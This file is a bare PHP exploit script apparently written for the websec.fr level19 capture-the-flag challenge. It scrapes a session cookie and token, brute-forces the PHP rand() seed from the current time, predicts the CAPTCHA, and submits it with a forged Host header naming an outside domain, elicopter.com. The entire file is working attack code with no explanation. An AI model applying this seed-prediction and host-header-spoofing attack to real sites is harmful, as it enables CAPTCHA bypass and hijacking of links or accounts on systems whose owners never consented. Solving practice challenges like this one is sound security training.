<?php

function generate_random_text($length) {
    $chars  = "abcdefghijklmnopqrstuvwxyz";
    $chars .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $chars .= "1234567890";

    $text = '';
    for ($i = 0; $i < $length; $i++) {
        $text .= $chars[rand() % strlen($chars)];
    }
    return $text;
}

// --- Step 1: GET request to fetch token and PHPSESSID ---
$opts = [
    "http" => [
        "method" => "GET",
        "header" => "User-Agent: PHP\r\n"
    ]
];
$context = stream_context_create($opts);
$response = file_get_contents("https://websec.fr/level19/index.php", false, $context);

// Extract PHPSESSID from response headers
$php_sessid = null;
foreach ($http_response_header as $hdr) {
    if (preg_match('/^Set-Cookie:\s*PHPSESSID=([^;]+)/', $hdr, $matches)) {
        $php_sessid = $matches[1];
        break;
    }
}

if (!$php_sessid) {
    die("[-] Could not retrieve PHPSESSID\n");
}

// Extract token
if (!preg_match('/name="token" value="([^"]+)"/', $response, $matches)) {
    die("[-] Could not find token\n");
}
$captured_token = $matches[1];

echo "[+] Captured token: $captured_token\n";
echo "[+] Captured PHPSESSID: $php_sessid\n";

// --- Step 2: Find seed ---
$now = microtime(true);
$found = false;

for ($seed = $now - 30; $seed <= $now + 30; $seed++) {
    srand($seed);
    $token = generate_random_text(32);
    if ($token === $captured_token) {
        echo "[+] Found seed: $seed (" . date("r", $seed) . ")\n";
        $found = true;
        break;
    }
}

if (!$found) {
    die("[-] Seed not found in the window.\n");
}

// --- Step 3: Generate CAPTCHA ---
$captcha = generate_random_text(ceil(255 / 10.0));
echo "[+] Generated CAPTCHA: $captcha\n";

// --- Step 4: POST request with PHPSESSID ---
$post_data = http_build_query([
    "captcha" => $captcha,
    "submit" => "Submit",
    "token" => $captured_token
]);

$opts = [
    "http" => [
        "method"  => "POST",
        "header"  => "Content-type: application/x-www-form-urlencoded\r\nCookie: PHPSESSID=$php_sessid\r\nHost: elicopter.com\r\n",
        "content" => $post_data
    ]
];

$context = stream_context_create($opts);
$response = file_get_contents("https://websec.fr/level19/index.php", false, $context);

echo "[+] Server response:\n$response\n";
